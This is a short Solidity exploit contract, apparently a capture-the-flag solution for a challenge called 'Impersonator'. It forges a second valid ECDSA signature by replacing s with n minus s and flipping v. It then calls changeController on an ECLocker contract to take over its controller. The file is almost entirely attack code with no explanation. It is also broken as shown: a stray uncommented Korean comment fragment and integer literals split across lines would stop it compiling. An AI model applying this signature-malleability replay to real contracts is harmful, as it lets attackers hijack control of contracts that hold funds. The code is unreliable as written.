// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Impersonator {
    function lockers(uint256) external returns (address);
}

interface ECLocker {
    function msgHash() external returns (bytes32);
    function open(uint8, bytes32, bytes32) external;
    function changeController(uint8, bytes32, bytes32, address) external;
}
contract Solve {
    address target;
    address eclocker;
    bytes32 msgHash;

    bytes32 n =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141; // n
    (secp256k1 곡선 기준)
    bytes32 r =
    bytes32(uint256(11397568185806560130291530949248708355673262872727946990834
    312389557386886033)); // r
    bytes32 s =
    bytes32(uint256(54405834204020870944342294544757609285398723182661749830189
    277079337680158706)); // s
    uint8 v = uint8(27); //v

    constructor(address _target) {
        target = _target;
        eclocker = Impersonator(target).lockers(0);
        msgHash = ECLocker(eclocker).msgHash();
    }

    function attack() public {
        bytes32 newS = bytes32(uint256(n) - uint256(s));
        uint8 newV = 27 + (1 - (v - 27));
        
        ECLocker(eclocker).changeController(newV, r, newS, address(0));
    }
}